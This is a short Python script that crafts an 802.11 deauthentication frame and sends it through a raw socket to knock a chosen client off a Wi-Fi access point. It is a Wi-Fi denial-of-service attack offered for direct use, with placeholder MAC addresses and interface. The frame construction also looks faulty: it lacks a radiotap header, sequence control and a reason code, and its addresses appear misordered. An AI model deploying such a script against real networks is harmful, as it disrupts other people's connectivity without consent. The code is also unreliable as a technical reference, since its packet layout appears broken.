import socket
import binascii

def send_deauth_packet(target_mac, ap_mac, interface):
    # Create a raw socket
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)

    # Set the network interface
    sock.bind((interface, 0))

    # Set the target MAC address
    target_mac = binascii.unhexlify(target_mac.replace(':', ''))

    # Set the access point MAC address
    ap_mac = binascii.unhexlify(ap_mac.replace(':', ''))

    # Set the deauth packet
    deauth_packet = b'\xC0\x00\x3A\x01' + ap_mac + target_mac + ap_mac

    # Send the deauth packet
    sock.send(deauth_packet)

    # Close the socket
    sock.close()


if __name__ == "__main__":
    # Set the target MAC address and access point MAC address
    target_mac = "00:11:22:33:44:55"
    ap_mac = "AA:BB:CC:DD:EE:FF"

    # Set the network interface
    interface = "wlan0"  # Replace "wlan0" with your interface name

    # Send the deauth packet
    send_deauth_packet(target_mac, ap_mac, interface)